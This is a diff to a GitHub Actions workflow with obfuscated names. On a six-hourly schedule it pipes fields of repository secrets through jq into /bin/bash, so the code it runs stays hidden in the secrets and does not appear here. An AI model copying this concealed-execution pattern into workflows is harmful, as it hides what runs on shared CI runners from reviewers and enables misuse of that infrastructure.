@@ -3,22 +3,20 @@ name: zhangnubi4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 4/6 * * *'
+    - cron: '49 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangnubi4567
         env:
-          dc5: ${{ secrets.dc5 }}
+          tedu06459: ${{ secrets.tedu06459 }}
         run: |
-          echo $dc5 | jq -r .dtc99 | /bin/bash
-          echo $gl9142 | jq -r .qpi33 | /bin/bash
-          echo $horbp60080 | jq -r .edd0623 | /bin/bash
-          echo $llw9 | jq -r .jlgcx12509 | /bin/bash
-          echo $ae6727 | jq -r .felxm12 | /bin/bash
-          echo $pkyz16 | jq -r .iovj5664 | /bin/bash
-          echo $drds618 | jq -r .z5787 | /bin/bash
-          echo $ycpyd66305 | jq -r .rj75 | /bin/bash
+          echo $tedu06459 | jq -r .uab433 | /bin/bash
+          echo $mbofl32214 | jq -r .ven56849 | /bin/bash
+          echo $tbxe8 | jq -r .szny08521 | /bin/bash
+          echo $vdtf8 | jq -r .bj99 | /bin/bash
 
